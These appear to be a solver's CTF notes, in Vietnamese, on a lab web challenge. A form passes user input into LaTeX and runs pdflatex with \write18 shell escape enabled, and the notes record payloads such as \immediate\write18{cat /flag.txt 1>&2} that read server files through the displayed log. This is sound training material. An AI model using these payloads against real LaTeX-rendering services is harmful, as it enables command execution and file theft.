# notes.md - justified

Input: instance `978870f9-5765-justified-06d98.mystery-challenges.webverselabs-pro.com`,
form `POST /proof.php` (9 field, không cần tài khoản). Tag đề: `CMDI`.

## H1 - Command injection trực tiếp trên các field text
cmd: POST với `title=T $(id)`, `T \`id\``, `T|id`, `year=2026;id`
evidence: không có thay đổi nào trong log; các field này chỉ được đưa vào văn bản LaTeX
result: DEAD - không có shell ở tầng này

## H2 - `reference` là jobname, thử injection ở đó
cmd: `reference` = `ref1;id`, `ref1$(id)`, `ref1|id`, `ref1&&id`, `ref1\nid`
evidence: **mọi payload cho ra cùng một jobname `ref1id.pdf`** trong log
  (`Output written on ref1id.pdf`) => filter dạng whitelist `[A-Za-z0-9_-]`, strip ký tự đặc biệt
result: DEAD - field này đã được làm sạch đúng cách

## H3 - Đọc log để fingerprint engine
cmd: POST hợp lệ rồi xem `<pre>` trong response
evidence: `This is pdfTeX, Version 3.141592653-2.6-1.40.26 (TeX Live 2025/dev/Debian)
  (preloaded format=pdflatex) \write18 enabled.` và `entering extended mode (./main.tex`
  => app tự sinh `main.tex` từ input người dùng rồi chạy `pdflatex`; **shell escape BẬT đầy đủ**
  (không phải `restricted \write18`)
result: OK - đây mới là "CMDI" mà tag nói: thực thi lệnh qua `\write18`

## H4 - Chứng minh LaTeX injection trong `title`
cmd: `title = A\typeout{ZZMARKERZZ}`
evidence: log chứa `ZZMARKERZZ` => backslash + macro của ta được TeX **dịch và chạy thật**
  (lưu ý: phải dựng payload bằng `String.fromCharCode(92)` khi gọi qua fetch trong JS,
  nếu không escape sequence của JS ăn mất backslash - lần probe đầu tiên hỏng vì đúng chỗ này)
result: OK - `title` là sink, không bị lọc (đề còn gợi ý nhập `M\"uller` kiểu LaTeX)

## H5 - Kênh lấy dữ liệu về
cmd: `title = B\immediate\write18{ls / 1>&2}` rồi `C\immediate\write18{cat /flag.txt 1>&2}`
evidence: `ls / 1>&2` không thấy trong log (nhiều dòng bị lẫn/parsing), nhưng
  `cat /flag.txt 1>&2` trả về đúng `WEBVERSE{d5f60724dc9f1197140001fa4b24198e}` trong log.
  Cơ chế: stderr của pdflatex được app gom vào log hiển thị trên trang, và `\write18`
  thừa hưởng fd của tiến trình con => redirect `1>&2` là đường ra ngắn nhất,
  không cần ghi file rồi `\input` hay đọc PDF
result: OK - có cờ

## H6 - Đóng gói và kiểm chứng lại
cmd: `python exploit.py <instance>` (requests, không cần cookie/đăng nhập)
evidence: lỗi đầu tiên là regex `<pre>` (log nằm trong `<pre class=...>`), sửa thành
  `<pre[^>]*>` + thêm UA/session GET thì chạy đúng, in lại cùng một cờ
result: OK - exploit tái chạy được, `flag.txt` đã ghi

## Đã nộp
Flag nộp trên WebVerse (`/c/33`), trang trả về **SOLVED - Your team has captured this flag on 26 Sept 2026**.
